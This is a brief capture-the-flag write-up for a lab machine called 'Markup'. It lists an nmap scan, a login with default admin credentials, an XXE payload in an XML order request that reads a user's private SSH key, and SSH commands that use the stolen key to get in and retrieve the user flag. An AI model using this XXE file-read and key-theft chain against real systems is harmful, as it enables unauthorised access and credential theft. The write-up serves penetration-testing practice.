# Writeup – Markup 

## Attack Path
### 1. Nmap scan
sudo nmap -sC -A -Pn 10.129.21.6

## 2. Go to the webserver by typing 10.129.21.6:80 into browser and use credentials admin:password to login

## 3. Start BurpSuite, set up FroxyProxy to intercept requests from port 8080 and interact with the input fields by filling in some random information and pressing the Submit button.

## 4. In BurpSuite, send the request to the Repeater module by right-clicking on the request and clicking pressing the Send to Repeater or by  CTRL + R combination on your keyboard. Then, switch to the Repeater tab at the top of the BurpSuite window and change the XML data section of the request to the following:
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
<order>
<quantity>
3
</quantity>
<item>
&test;
</item>
<address>
17th Estate, CA
</address>
</order>

## 5. Run SSH to login as daniel
touch id_rsa
ls -la id_rsa
chmod 400 id_rsa
ssh -i id_rsa daniel@10.129.21.6
user flag can be retrieved from  C:\Users\daniel\Desktop
